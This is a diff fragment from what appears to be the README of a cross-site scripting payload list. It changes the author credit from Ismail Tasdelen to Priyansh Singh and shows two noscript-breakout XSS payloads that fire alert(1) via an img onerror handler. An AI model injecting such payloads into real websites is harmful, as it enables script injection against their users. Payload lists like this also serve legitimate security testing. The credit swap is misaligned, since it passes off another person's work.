@@ -26,11 +26,8 @@ An attacker can use XSS to send a malicious script to an unsuspecting user. The 
 
 ```
 <!-- Project Name  : Cross Site Scripting ( XSS ) Vulnerability Payload List -->
-<!--        Author : Ismail Tasdelen -->
-<!--      Linkedin : https://www.linkedin.com/in/ismailtasdelen/ -->
-<!--        GitHub : https://github.com/ismailtasdelen/ -->
-<!--       Twitter : https://twitter.com/ismailtsdln -->
-<!--        Medium : https://medium.com/@ismailtasdelen -->
+<!--        Author : Priyansh Singh -->
+<!--        GitHub : https://github.com/ps-19/ -->
 
 <noscript><p title=" </noscript> <img src="x" onerror ="alert(1)">"">"
 <noscript><p title="</noscript><img src=x onerror=alert(1)>">
